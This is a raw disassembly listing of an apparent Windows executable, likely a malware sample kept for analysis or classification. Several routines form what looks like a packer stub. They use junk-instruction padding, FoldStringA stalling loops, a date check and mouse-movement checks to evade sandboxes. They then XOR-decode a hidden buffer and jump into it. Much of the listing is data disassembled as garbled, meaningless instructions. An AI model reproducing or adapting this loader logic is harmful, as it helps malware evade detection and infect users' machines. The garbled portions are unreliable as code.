add esp 0xfffffff0
call sub_4036f4
mov eax esi
pop esi
pop ebx
retn
call sub_40374c
pop [ fs : 0x0 ]
add esp 0xc
sub_47d0a8
push ebx
push esi
call sub_40375c
mov ebx edx
mov esi eax
mov edx ebx
and dl 0xfc
mov eax esi
call sub_470d78
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403744
sub_47d0d0
push ebp
mov ebp esp
push 0x0
push 0x0
push ebx
push esi
mov esi ecx
mov ebx eax
xor eax eax
push ebp
push j_sub_403b24#3
push [ fs : eax ]
mov [ fs : eax ] esp
cmp edx 0xf002
jg r-xdata
sub edx 0xf003
je r-xdata
je r-xdata
cmp [ ebx + 0x62 ] 0x0
je r-xdata
dec edx
je r-xdata
cmp [ ebx + 0x5a ] 0x0
je r-xdata
sub edx 0xffffffff
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47d1d1
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_404844
retn
lea eax [ ebp - 0x8 ]
mov edx [ esi ]
add edx 0x10
call sub_4132dc
mov eax [ ebp - 0x8 ]
push eax
mov eax [ esi ]
call sub_410254
mov ecx eax
mov edx ebx
mov eax [ ebx + 0x64 ]
call [ ebx + 0x60 ]
jmp r-xdata
cmp [ ebx + 0x6a ] 0x0
je r-xdata
jmp r-xdata
lea eax [ ebp - 0x4 ]
mov edx [ esi ]
add edx 0x10
call sub_4132dc
mov eax [ ebp - 0x4 ]
push eax
mov eax [ esi ]
add eax 0x20
call sub_410254
push eax
mov eax [ esi ]
add eax 0x30
call sub_410254
push eax
mov eax [ esi ]
call sub_410d18
mov ecx eax
mov edx ebx
mov eax [ ebx + 0x5c ]
call [ ebx + 0x58 ]
jmp r-xdata
sub edx 0xf002
je r-xdata
mov edx ebx
mov eax [ ebx + 0x6c ]
call [ ebx + 0x68 ]
cmp [ ebx + 0x52 ] 0x0
je r-xdata
jmp r-xdata
mov edx ebx
mov eax [ ebx + 0x54 ]
call [ ebx + 0x50 ]
jmp r-xdata
sub_47d1d8
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_47d1fd
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47d204
retn
sub_47d2ea
inc ebp
add [ eax + ecx ] al
inc esi
add [ esp + ebp * 4 ] cl
inc esp
add al cl
adc al 0x46
add [ eax ] ch
sbb [ esi ] al
in al 0x16
inc esi
add [ esp + ebp * 4 - 0x5357ffbc ] ah
inc esp
add [ eax + 0x19 ] ah
inc esi
add [ eax ] cl
stosd [ edi ]
inc esp
add [ eax + 0x540044d7 ] bh
and [ esi ] al
mov ecx gs
inc esp
add ah bh
rol [ eax + eax + 0x68 ] cl
xor eax 0xeaec0046
inc ebp
add [ ebp + ebp * 8 + 0x26480045 ] bl
inc esi
add [ esi + esi * 8 - 0x8ffffbb ] al
inc ebp
add [ eax + 0x39 ] cl
inc esi
add [ ebx + esi * 8 + 0x344c0045 ] bh
inc esi
add [ ebx + ebx ] ch
inc esi
add [ eax ] al
inc esi
add ah ah
add [ esi ] al
adc al [ eax ]
0xf80047d4 0x2
add [ eax ] al
add [ ebx ] cl
push ebx
jns r-xdata
adc [ ebx ] al
add [ eax ] al
push es
arpl [ edi + 0x62 ] cx
push 0x65
arpl [ ecx + esi - 0x4 ] si
add al [ eax ]
add [ ecx ] al
add [ esi ] dl
push eax
outsd
ja r-xdata
add [ edx ] cl
outsd
ja r-xdata
jb r-xdata
push cs
add [ ecx ] cl
inc edi
jb r-xdata
sub [ ebx ] al
add [ eax ] al
or al 0x0
jo r-xdata
or dl [ eax + 0x6f ]
xor [ ebx + eax ] edx
add [ eax ] al
add [ edi ] al
push ebp
jo r-xdata
or [ ecx + 0x6e ] al
outsd
imul ebp [ esi + 0x74 ] 0x6c707041
imul esp [ ebx + 0x61 ] 0x6e6f6974
xor [ eax ] eax
add eax [ eax ]
add [ edx ] al
add [ esi ] cl
inc esp
inc ebx
insb
imul esp [ ebp + 0x6e ] 0x6e6f4374
jbe r-xdata
sub al [ ebp ]
jne r-xdata
add al dl
jo r-xdata
or [ ebx + 0x68 ] eax
arpl [ gs : ebx + 0x42 ] bp
outsd
js r-xdata
outsd
outsb
je r-xdata
je r-xdata
add al 0x3
add [ eax ] al
add eax [ eax ]
push cs
inc esp
push ebx
jb r-xdata
adc bh bh
nop
movss xmm7 xmm7
movss xmm3 xmm3
mov ebx 0x1bb7
xor [ edx + edx * 8 + 0x47 ] ebx
add [ eax + ecx * 8 + 0x5e0045 ] ch
add eax 0x74696e55
in al 0xd4
inc edi
add [ edi ] al
push es
push esp
inc esi
outsd
jb r-xdata
inc edx
outsd
js r-xdata
retn
into
outsb
jne r-xdata
inc edx
outsd
insb
xor [ eax ] ebx
add eax [ eax ]
add [ eax ] cl
add [ ebx + eax * 2 ] cl
outsd
insb
outsd
jb r-xdata
add eax 0x6f6d654d
imul eax [ edx + 0x6f ] 0x78
xor [ eax ] ebp
add eax [ eax ]
add [ eax + eax ] cl
add eax [ eax ]
add [ esi ] al
xor [ eax ] edx
add [ edi ] al
dec ecx
push ebx
dec esi
push esp
push eax
xor [ ebx + eax ] esp
add [ eax ] al
or eax [ eax ]
jb r-xdata
movss xmm3 xmm3
movss xmm7 xmm7
nop
movss xmm5 xmm5
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
call FoldStringA
nop
nop
movss xmm2 xmm2
movss xmm0 xmm0
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
call FoldStringA
movss xmm0 xmm0
movss xmm4 xmm4
movss xmm6 xmm6
movss xmm1 xmm1
dec ebx
jne r-xdata
nop
nop
nop
push r-xdata
push r-xdata
call GetModuleHandleA
push eax
call GetProcAddress
test eax eax
je r-xdata
sub [ ebx ] al
shr [ edi + 0x43 ] 0x0
fsubr [ ecx + 0x43 ]
add [ eax + 0x4c00435e ] dh
adc eax [ ebx ]
mov esp 0xd0004316
mov [ esi ] 0xa0
leave
inc esi
add [ eax ] dh
cmp [ ebx ] al
add [ eax ] al
sldt [ esi ]
adc [ eax ] al
or eax [ ecx + 0x63 ]
je r-xdata
outsd
js r-xdata
xor [ ebx ] al
add [ eax ] al
or eax [ eax ]
or [ ebx + 0x68 ] eax
arpl [ gs : ebx + 0x42 ] bp
outsd
jb r-xdata
xor al 0x3
add [ eax ] al
xor [ ebx + eax ] ebp
add [ eax ] al
or eax 0x6f500a00
imul esp [ ecx + 0x6c ] 0x1c31676f
add eax [ eax ]
add [ ecx ] cl
add [ esi ] cl
push edx
jo r-xdata
outsd
outsb
jbe r-xdata
nop
nop
nop
movss xmm4 xmm4
push 0x0
push 0x0
call SetAbortProc
nop
movss xmm3 xmm3
movss xmm3 xmm3
movss xmm3 xmm3
call GetLastError
mov [ rw-data ] eax
movss xmm6 xmm6
nop
movss xmm6 xmm6
nop
push rw-data
call GetLocalTime
movss xmm7 xmm7
movss xmm6 xmm6
movss xmm2 xmm2
nop
cmp [ rw-data ] 0x7e0
jae r-xdata
nop
movss xmm5 xmm5
nop
jmp r-xdata
xor [ eax ] eax
add [ ebx - 0x1374aa40 ] cl
xor eax eax
push ebp
add [ 0x74696e55 ] al
outsd
outsb
dec esp
imul esi [ ebx + 0x74 ] 0x46540631
push sub_47d525
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47d52c
retn
inc edi
add [ edx + ebx ] ah
inc edi
add [ eax - 0x3a ] cl
inc esi
add [ eax + 0x300046c9 ] ah
xor [ ecx ] edx
add [ eax - 0x32 ] ch
push eax
popad
outsb
insb
xor [ ebx + eax ] edi
add [ eax ] al
popad
arpl [ ebp + 0x44 ] sp
imul esp [ ecx + 0x6c ] 0x2031676f
add eax [ eax ]
pop es
add [ esi ] cl
dec eax
popad
jb r-xdata
imul ebp [ ebp + 0x61 ] 0x10316574
or [ ebx ] al
add [ eax ] al
add al 0x0
or [ eax + 0x61 ] edx
imul ebp [ esi + 0x74 ] 0x31786f42
or al 0x3
add [ eax ] al
add eax 0x6e410800
movss xmm0 xmm0
movss xmm5 xmm5
movss xmm7 xmm7
movss xmm1 xmm1
cmp [ rw-data ] 0x6
je r-xdata
nop
movss xmm1 xmm1
movss xmm1 xmm1
movss xmm7 xmm7
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47d8fd
retn
mov ebx 0x1525
nop
movss xmm7 xmm7
nop
movss xmm6 xmm6
jmp r-xdata
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
call FoldStringA
dec ebx
jne r-xdata
nop
nop
movss xmm1 xmm1
movss xmm6 xmm6
movss xmm0 xmm0
nop
nop
nop
movss xmm3 xmm3
nop
nop
nop
movss xmm4 xmm4
nop
mov eax 0x1d78f83b
call sub_4027b4
mov ecx eax
movss xmm6 xmm6
nop
nop
test ecx ecx
je r-xdata
nop
nop
movss xmm0 xmm0
mov ebx 0x1
nop
movss xmm7 xmm7
movss xmm5 xmm5
lea eax [ ebx + 0x1 ]
mov edi 0xf7
xor edx edx
div edi
mov eax ecx
add eax ebx
mov [ eax ] dl
movss xmm6 xmm6
movss xmm1 xmm1
nop
nop
inc ebx
cmp ebx 0x1d78d700
jne r-xdata
movss xmm3 xmm3
nop
nop
nop
mov eax ecx
call sub_4027d4
nop
movss xmm1 xmm1
nop
movss xmm2 xmm2
mov ebx 0x8b46
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
call FoldStringA
dec ebx
jne r-xdata
xor ebx ebx
nop
nop
nop
push rw-data
call GetCursorPos
movss xmm6 xmm6
movss xmm0 xmm0
movss xmm7 xmm7
movss xmm1 xmm1
nop
movss xmm3 xmm3
movss xmm1 xmm1
nop
push 0x25
call sub_4066d0
nop
nop
nop
movss xmm5 xmm5
cmp ebx 0x4
jbe r-xdata
movss xmm6 xmm6
movss xmm1 xmm1
movss xmm6 xmm6
nop
inc ebx
movss xmm2 xmm2
nop
nop
movss xmm1 xmm1
mov eax [ esi ]
mov [ rw-data ] eax
nop
nop
nop
movss xmm5 xmm5
movss xmm7 xmm7
movss xmm1 xmm1
nop
nop
push esi
call GetCursorPos
nop
nop
movss xmm5 xmm5
movss xmm0 xmm0
mov eax [ esi ]
sub eax [ rw-data ]
cmp eax 0x23
jbe r-xdata
movss xmm2 xmm2
nop
movss xmm5 xmm5
nop
mov eax 0x8419
call sub_4027b4
mov [ rw-data ] eax
nop
nop
movss xmm3 xmm3
cmp [ rw-data ] 0x0
jne r-xdata
movss xmm7 xmm7
nop
movss xmm0 xmm0
movss xmm1 xmm1
mov edx rw-data
mov ecx 0x585a
mov eax [ rw-data ]
call sub_406e94
nop
movss xmm5 xmm5
nop
nop
xor ebx ebx
movss xmm4 xmm4
movss xmm3 xmm3
movss xmm6 xmm6
jmp r-xdata
mov eax [ rw-data ]
add eax ebx
mov al [ eax ]
movss xmm6 xmm6
movss xmm6 xmm6
nop
nop
xor al 0x2f
mov edx [ rw-data ]
add edx ebx
mov [ edx ] al
movss xmm2 xmm2
movss xmm7 xmm7
movss xmm5 xmm5
movss xmm1 xmm1
inc ebx
cmp ebx 0x585b
jne r-xdata
movss xmm3 xmm3
nop
movss xmm7 xmm7
movss xmm1 xmm1
nop
movss xmm3 xmm3
movss xmm0 xmm0
nop
movss xmm2 xmm2
movss xmm5 xmm5
nop
xor esi esi
nop
movss xmm3 xmm3
movss xmm5 xmm5
add esi [ rw-data ]
movss xmm6 xmm6
nop
nop
movss xmm3 xmm3
xchg ebx esi
movss xmm5 xmm5
movss xmm6 xmm6
movss xmm0 xmm0
movss xmm2 xmm2
add ebx 0x217c
nop
nop
movss xmm1 xmm1
movss xmm5 xmm5
push ebx
movss xmm7 xmm7
nop
movss xmm3 xmm3
nop
retn
sub_47d4ce
inc ebx
add ah ah
pop edi
inc ebp
add [ eax - 0x7bffbc51 ] ah
xor al [ ebx ]
mov eax 0xe400452a
aam 0x47
add [ edi ] al
push es
push esp
inc esi
outsd
jb r-xdata
adc bh bh
nop
movss xmm7 xmm7
movss xmm3 xmm3
mov ebx 0x1bb7
xor [ edx + edx * 8 + 0x47 ] ebx
add [ eax + ecx * 8 + 0x5e0045 ] ch
add eax 0x74696e55
xor [ eax ] eax
add [ ebx - 0x1374aa40 ] cl
xor eax eax
push ebp
push sub_47d525
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47d52c
retn
movss xmm3 xmm3
movss xmm7 xmm7
nop
movss xmm5 xmm5
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
call FoldStringA
nop
nop
movss xmm2 xmm2
movss xmm0 xmm0
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
call FoldStringA
movss xmm0 xmm0
movss xmm4 xmm4
movss xmm6 xmm6
movss xmm1 xmm1
dec ebx
jne r-xdata
nop
nop
nop
push r-xdata
push r-xdata
call GetModuleHandleA
push eax
call GetProcAddress
test eax eax
je r-xdata
nop
nop
nop
movss xmm4 xmm4
push 0x0
push 0x0
call SetAbortProc
nop
movss xmm3 xmm3
movss xmm3 xmm3
movss xmm3 xmm3
call GetLastError
mov [ rw-data ] eax
movss xmm6 xmm6
nop
movss xmm6 xmm6
nop
push rw-data
call GetLocalTime
movss xmm7 xmm7
movss xmm6 xmm6
movss xmm2 xmm2
nop
cmp [ rw-data ] 0x7e0
jae r-xdata
nop
movss xmm5 xmm5
nop
jmp r-xdata
movss xmm0 xmm0
movss xmm5 xmm5
movss xmm7 xmm7
movss xmm1 xmm1
cmp [ rw-data ] 0x6
je r-xdata
nop
movss xmm1 xmm1
movss xmm1 xmm1
movss xmm7 xmm7
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47d8fd
retn
mov ebx 0x1525
nop
movss xmm7 xmm7
nop
movss xmm6 xmm6
jmp r-xdata
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
call FoldStringA
dec ebx
jne r-xdata
nop
nop
movss xmm1 xmm1
movss xmm6 xmm6
movss xmm0 xmm0
nop
nop
nop
movss xmm3 xmm3
nop
nop
nop
movss xmm4 xmm4
nop
mov eax 0x1d78f83b
call sub_4027b4
mov ecx eax
movss xmm6 xmm6
nop
nop
test ecx ecx
je r-xdata
nop
nop
movss xmm0 xmm0
mov ebx 0x1
nop
movss xmm7 xmm7
movss xmm5 xmm5
lea eax [ ebx + 0x1 ]
mov edi 0xf7
xor edx edx
div edi
mov eax ecx
add eax ebx
mov [ eax ] dl
movss xmm6 xmm6
movss xmm1 xmm1
nop
nop
inc ebx
cmp ebx 0x1d78d700
jne r-xdata
movss xmm3 xmm3
nop
nop
nop
mov eax ecx
call sub_4027d4
nop
movss xmm1 xmm1
nop
movss xmm2 xmm2
mov ebx 0x8b46
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
call FoldStringA
dec ebx
jne r-xdata
xor ebx ebx
nop
nop
nop
push rw-data
call GetCursorPos
movss xmm6 xmm6
movss xmm0 xmm0
movss xmm7 xmm7
movss xmm1 xmm1
nop
movss xmm3 xmm3
movss xmm1 xmm1
nop
push 0x25
call sub_4066d0
nop
nop
nop
movss xmm5 xmm5
cmp ebx 0x4
jbe r-xdata
movss xmm6 xmm6
movss xmm1 xmm1
movss xmm6 xmm6
nop
inc ebx
movss xmm2 xmm2
nop
nop
movss xmm1 xmm1
mov eax [ esi ]
mov [ rw-data ] eax
nop
nop
nop
movss xmm5 xmm5
movss xmm7 xmm7
movss xmm1 xmm1
nop
nop
push esi
call GetCursorPos
nop
nop
movss xmm5 xmm5
movss xmm0 xmm0
mov eax [ esi ]
sub eax [ rw-data ]
cmp eax 0x23
jbe r-xdata
movss xmm2 xmm2
nop
movss xmm5 xmm5
nop
mov eax 0x8419
call sub_4027b4
mov [ rw-data ] eax
nop
nop
movss xmm3 xmm3
cmp [ rw-data ] 0x0
jne r-xdata
movss xmm7 xmm7
nop
movss xmm0 xmm0
movss xmm1 xmm1
mov edx rw-data
mov ecx 0x585a
mov eax [ rw-data ]
call sub_406e94
nop
movss xmm5 xmm5
nop
nop
xor ebx ebx
movss xmm4 xmm4
movss xmm3 xmm3
movss xmm6 xmm6
jmp r-xdata
mov eax [ rw-data ]
add eax ebx
mov al [ eax ]
movss xmm6 xmm6
movss xmm6 xmm6
nop
nop
xor al 0x2f
mov edx [ rw-data ]
add edx ebx
mov [ edx ] al
movss xmm2 xmm2
movss xmm7 xmm7
movss xmm5 xmm5
movss xmm1 xmm1
inc ebx
cmp ebx 0x585b
jne r-xdata
movss xmm3 xmm3
nop
movss xmm7 xmm7
movss xmm1 xmm1
nop
movss xmm3 xmm3
movss xmm0 xmm0
nop
movss xmm2 xmm2
movss xmm5 xmm5
nop
xor esi esi
nop
movss xmm3 xmm3
movss xmm5 xmm5
add esi [ rw-data ]
movss xmm6 xmm6
nop
nop
movss xmm3 xmm3
xchg ebx esi
movss xmm5 xmm5
movss xmm6 xmm6
movss xmm0 xmm0
movss xmm2 xmm2
add ebx 0x217c
nop
nop
movss xmm1 xmm1
movss xmm5 xmm5
push ebx
movss xmm7 xmm7
nop
movss xmm3 xmm3
nop
retn
sub_47d968
add [ fs : eax ] al
add [ eax - 0x27 ] dh
inc edi
add [ ebx + 0x40 ] bl
add [ ebx ] ch
inc eax
add [ eax + 0x61 ] dl
inc eax
add ah bh
pushad
inc eax
add ah ch
arpl [ eax ] ax
mov esp 0x4063
jno r-xdata
add ah dh
add [ ecx ] 0xffffff80
dec ebp
inc edx
add al dl
jo r-xdata
mov edx 0xba480045
inc ebp
add [ ebp + eax + 0x43 ] bh
add [ eax - 0x77ffbd1a ] bh
out 0x42 al
dec esp
inc edx
add [ eax - 0x2fffbdb3 ] al
add [ eax ] bh
jno r-xdata
push eax
inc ebx
add [ eax - 0x37ffbcb0 ] ch
dec edi
inc ebx
add [ eax + 0x2000434f ] dl
inc ebx
add [ eax + 0xf ] al
inc ebx
add [ eax + 0x40004350 ] cl
push eax
inc ebx
add al dh
cmovae eax [ eax ]
loopne r-xdata
add al dh
loope r-xdata
add al dl
add [ eax ] cl
jno r-xdata
mov dh 0x46
add [ eax + 0x3800467f ] ah
add [ esi ] 0x8
add [ esi ] 0x10
test [ esi ] al
loopne r-xdata
push ecx
inc ebx
add [ ecx + edx * 2 + 0xdb40043 ] bh
inc esp
add [ ebp + ecx + 0x740044 ] al
inc ebx
add [ eax + eax + 0x43 ] al
add [ eax + 0x7c004300 ] bh
add [ ebx ] al
adc [ ecx ] dl
inc ebx
add al ah
adc [ ebx ] al
dec eax
adc [ ebx ] eax
sbb [ ecx ] dl
inc ebx
add al dh
daa
inc ebx
add [ edi + 0x4dbc0043 ] dl
inc ebx
add [ ebp + ecx * 2 + 0x43 ] dh
add [ eax + 0x7800430f ] ch
cmovae eax [ eax ]
jo r-xdata
adc [ ebx ] al
nop
adc [ ebx ] al
in al dx
inc ebx
add [ eax - 0x3fffbcf1 ] dh
cmovae eax [ eax ]
mov al 0xf
inc ebx
add al al
add [ ebp + eax + 0x43 ] cl
add [ edi + ecx ] ah
inc ebx
add al dl
push cs
inc ebx
add [ eax + 0x58004310 ] cl
adc [ ebx ] al
push eax
adc [ ebx ] al
and [ eax ] dl
inc ebx
add [ eax ] bl
adc [ ebx ] al
call 0xffffffffe0481d60
add [ esp + edx * 2 + 0x45 ] dl
add [ esp + edx * 2 ] ah
inc ebp
add [ eax + esi * 8 + 0x42 ] al
add [ eax + esi * 8 ] dl
inc edx
add [ eax + 0x480045ba ] bh
mov edx 0x57c0045
inc ebx
add [ eax ] al
in al 0x42
add al dl
jecxz r-xdata
add [ edi + eax * 4 - 0x789bffbf ] dl
inc ecx
add [ eax + 0x58004074 ] cl
je r-xdata
push eax
inc ebx
add al dh
dec edi
inc ebx
add al dh
dec esi
inc ebx
add al al
dec esi
inc ebx
add [ eax + 0x4e ] ch
inc ebx
add [ esi + ecx * 2 ] ch
inc ebx
add [ edi + ecx ] bl
inc esp
add ah ch
push cs
inc esp
add [ ecx + edx * 2 + 0x43 ] bl
add [ ecx + edx * 2 ] cl
inc ebx
add [ ecx + edx * 2 + 0x51640043 ] dh
inc ebx
add [ esi + ecx * 2 ] ah
inc ebx
add ah dh
dec ebp
inc ebx
add [ ebx ] dh
inc ebx
add [ edx - 0x51d7ffbd ] bh
inc ebx
add ah ah
lodsd [ esi ]
inc ebx
add [ eax + 0x28004527 ] dl
daa
inc ebp
add [ ebp + edi + 0x45 ] cl
add [ edi + 0x1be80045 ] bl
inc esp
add [ eax + 0x1b ] dh
inc esp
add al dl
add eax [ ebx ]
mov al [ 0xfffffffffc004303 ]
jg r-xdata
add [ esi + esi * 4 ] ch
inc esi
add [ esi + esi * 4 - 0x499bffba ] dl
inc esi
add al al
mov edx 0xba780046
inc esi
add al bl
mov esi 0xbea80046
inc esi
add [ eax ] cl
retn 0x46
inc esi
add [ edi + ebp * 4 + 0x46 ] dl
add [ edi + ebp * 4 ] ah
inc esi
add [ eax ] dh
xchg ebp eax
inc esi
add al bh
xchg esp eax
inc esi
add [ eax - 0x6b ] dh
inc esi
add [ eax - 0x6b ] al
inc esi
add [ eax ] cl
sahf
inc esi
add al bl
popfd
inc esi
add al bh
scasb [ edi ]
inc esi
add [ esi + ebp * 4 - 0x4bb7ffba ] dh
inc esi
add [ ebx + esi * 4 - 0x49a3ffba ] cl
inc esi
add [ eax + eax ] bh
inc ebx
add ah bh
inc [ edx ]
add al 0xf0
inc edx
add ah dl
out dx eax
inc edx
add [ eax + ebp * 8 - 0x17abffbe ] al
inc edx
add ah bh
push eax
inc edx
add ah cl
push eax
inc edx
add ah al
loop r-xdata
add [ eax - 0x23 ] al
inc eax
add al al
fild [ eax ]
aam 0xe5
inc eax
add [ ebp + 0x693c0040 ] ah
inc ecx
add ah al
push 0x6b180041
inc ecx
add al ch
push 0x41
add [ esp + eax * 4 + 0x41 ] al
_start
push ebp
mov ebp esp
add esp 0xfffffff0
mov eax sub_47d968
call sub_4062e8
mov eax [ rw-data ]
mov eax [ eax ]
call sub_466a50
mov ecx [ rw-data ]
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ r-xdata ]
call sub_466a68
mov eax [ rw-data ]
mov eax [ eax ]
call sub_466ae8
call sub_404030
ExitProcess
jmp [ __import_lookup_table_0(kernel32:ExitProcess) ]
sub_401324
jmp [ __import_lookup_table_1(user32:MessageBoxA) ]
FindClose
jmp [ __import_lookup_table_0(kernel32:FindClose) ]
FindFirstFileA
jmp [ FindFirstFileA@IAT ]
sub_40133c
jmp [ __import_lookup_table_0(kernel32:FreeLibrary) ]
GetCommandLineA
jmp [ __import_lookup_table_0(kernel32:GetCommandLineA) ]
sub_40134c
jmp [ __import_lookup_table_0(kernel32:GetLocaleInfoA) ]
sub_401354
jmp [ __import_lookup_table_0(kernel32:GetModuleFileNameA) ]
sub_40135c
jmp [ __import_lookup_table_0(kernel32:GetModuleHandleA) ]
sub_401364
jmp [ __import_lookup_table_0(kernel32:GetProcAddress) ]
GetStartupInfoA
jmp [ __import_lookup_table_0(kernel32:GetStartupInfoA) ]
sub_401384
jmp [ __import_lookup_table_1(user32:LoadStringA) ]
sub_40139c
jmp [ __import_lookup_table_0(kernel32:MultiByteToWideChar) ]
sub_4013a4
jmp [ __import_lookup_table_2(advapi32:RegCloseKey) ]
WideCharToMultiByte
jmp [ WideCharToMultiByte@IAT ]
sub_4013c4
jmp [ __import_lookup_table_0(kernel32:VirtualQuery) ]
SysAllocStringLen
jmp [ __import_lookup_table_3(oleaut32:SysAllocStringLen) ]
SysReAllocStringLen
jmp [ SysReAllocStringLen@IAT ]
sub_4013dc
jmp [ __import_lookup_table_3(oleaut32:SysFreeString) ]
InterlockedIncrement
jmp [ InterlockedIncrement@IAT ]
InterlockedDecrement
jmp [ InterlockedDecrement@IAT ]
sub_4013f4
jmp [ __import_lookup_table_0(kernel32:GetCurrentThreadId) ]
sub_401404
push ebx
add esp 0xffffffbc
mov ebx 0xa
push esp
call GetStartupInfoA
test [ esp + 0x2c ] 0x1
je r-xdata
mov eax ebx
add esp 0x44
pop ebx
retn
movzx ebx [ esp + 0x30 ]
sub_401428
jmp [ __import_lookup_table_0(kernel32:LocalAlloc) ]
VirtualFree
jmp [ __import_lookup_table_0(kernel32:VirtualFree) ]
sub_401448
jmp [ __import_lookup_table_0(kernel32:InitializeCriticalSection) ]
sub_401450
jmp [ __import_lookup_table_0(kernel32:EnterCriticalSection) ]
sub_401458
jmp [ __import_lookup_table_0(kernel32:LeaveCriticalSection) ]
sub_401460
jmp [ __import_lookup_table_0(kernel32:DeleteCriticalSection) ]
sub_401baa
jmp sub_403b24
sub_401bb1
mov al [ rw-data ]
pop ebp
retn
sub_401c8e
jmp sub_403b24
sub_401d5c
inc [ rw-data ]
mov edx eax
sub edx 0x4
mov edx [ edx ]
and edx 0x7ffffffc
sub edx 0x4
add [ rw-data ] edx
call sub_402370
retn
sub_40235c
jmp sub_403b24
sub_402502
jmp sub_403b24
sub_4027a1
jmp sub_403b24
sub_402864
call sub_40629c
cmp [ eax ] 0x0
je r-xdata
xor eax eax
retn
call sub_40629c
mov eax [ eax ]
mov eax [ eax + 0x4 ]
retn
sub_4028b8
mov [ rw-data ] edx
call sub_404108
sub_40291c
push eax
push edx
push ecx
call sub_40629c
cmp [ eax + 0x4 ] 0x0
pop ecx
pop edx
pop eax
jne r-xdata
xor eax eax
jmp sub_402910
retn
sub_402938
retn
sub_40298c
retn
sub_402990
push ebx
call sub_40629c
mov ebx [ eax + 0x4 ]
call sub_40629c
xor edx edx
mov [ eax + 0x4 ] edx
mov eax ebx
pop ebx
retn
sub_402b48
mov [ rw-data ] ax
fnclex
fldcw [ rw-data ]
retn
sub_402b58
push 0x0
fnstcw [ esp ]
pop eax
retn
sub_402bf4
mov edx [ eax + 0x1c ]
call sub_402bac
retn
sub_402c87
retn
sub_402c88
xor ecx ecx
mov cl [ edx ]
inc ecx
xchg edx eax
call sub_4029b0
retn
sub_402e98
mov ecx 0xff
call sub_402ea4
retn
sub_402ec8
push esi
push edi
mov esi eax
mov edi edx
and ecx 0xff
[ esi ] [ edi ]
pop edi
pop esi
retn
j_sub_402ee4
jmp sub_402ee4
sub_402ee1
retn
sub_403271
jmp sub_403b24
sub_4032c4
fninit
fwait
fldcw [ rw-data ]
retn
sub_40331c
mov eax [ eax - 0x24 ]
test eax eax
je r-xdata
retn
mov eax [ eax ]
sub_403328
push ebx
mov ebx eax
mov eax ebx
call sub_403358
call sub_4027b4
mov edx eax
mov eax ebx
call sub_40339c
pop ebx
retn
sub_403344
push ebx
mov ebx eax
mov eax ebx
call sub_4033f4
mov eax ebx
call sub_4027d4
pop ebx
retn
sub_403358
add eax 0xffffffd8
mov eax [ eax ]
retn
sub_403380
call sub_40375c
test dl dl
jle r-xdata
retn
call sub_403744
sub_403440
retn
sub_4034c8
jmp sub_403b24
sub_4034cf
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_4035d8
mov eax 0x8000ffff
retn
sub_4035e0
retn
sub_4035e4
retn
sub_4035e8
retn
sub_40371d
jmp sub_403870
sub_403722
mov eax [ esp + 0x2c ]
mov eax [ eax + 0xc ]
test eax eax
je r-xdata
call sub_403b84
retn
mov ecx [ eax ]
mov dl 0x81
push eax
call [ ecx - 0x4 ]
pop eax
call sub_403744
sub_403744
mov edx [ eax ]
call [ edx - 0x8 ]
retn
sub_40374c
push ebx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx - 0x1c ]
mov eax ebx
pop ebx
retn
sub_40375c
test dl dl
jg r-xdata
push eax
push edx
mov edx [ eax ]
call [ edx - 0x18 ]
pop edx
pop eax
retn
retn
sub_40376c
cmp [ rw-data ] 0x1
jbe r-xdata
retn
push 0x0
push 0x0
push 0x0
push 0xeedfadf
call [ rw-data ]
sub_403834
cmp [ rw-data ] 0x1
jbe r-xdata
retn
push edx
push esp
push 0x1
push 0x0
push 0xeedfae2
call [ rw-data ]
pop edx
sub_403850
push eax
push edx
cmp [ rw-data ] 0x1
jbe r-xdata
pop edx
pop eax
retn
push esp
push 0x2
push 0x0
push 0xeedfae3
call [ rw-data ]
sub_403c1d
retn
sub_403d60
xor edx edx
lea eax [ ebp - 0xc ]
mov ecx [ fs : edx ]
mov [ fs : edx ] eax
mov [ eax ] ecx
mov [ eax + 0x4 ] r-xdata
mov [ eax + 0x8 ] ebp
mov [ rw-data ] eax
retn
sub_403dee
jmp sub_403870
sub_403e4e
jmp sub_403870
sub_403e68
mov [ rw-data ] r-xdata
mov [ rw-data ] r-xdata
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
mov [ rw-data ] edx
mov eax [ edx + 0x4 ]
mov [ rw-data ] eax
call sub_403d60
mov [ rw-data ] 0x0
call sub_403e08
retn
sub_403fa1
retn
sub_404103
pop ebp
pop edi
pop esi
pop ebx
retn
sub_404108
mov [ rw-data ] eax
call sub_404030
sub_404344
retn
sub_404380
retn
sub_40438e
retn
sub_4043a7
retn
sub_4043b8
retn
sub_40449f
retn
j_sub_4045ec
jmp sub_4045ec
sub_404635
retn
sub_40463d
retn
sub_40467f
retn
sub_404804
test eax eax
je r-xdata
retn
push eax
push 0x0
call SysAllocStringLen
test eax eax
je r-xdata
mov al 0x1
jmp sub_402910
sub_40481c
xchg [ eax ] edx
test edx edx
je r-xdata
retn
push edx
call sub_4013dc
sub_404974
retn
sub_404986
retn
sub_404b7c
mov ecx 0x1
jmp sub_404ae8
sub_404b86
retn
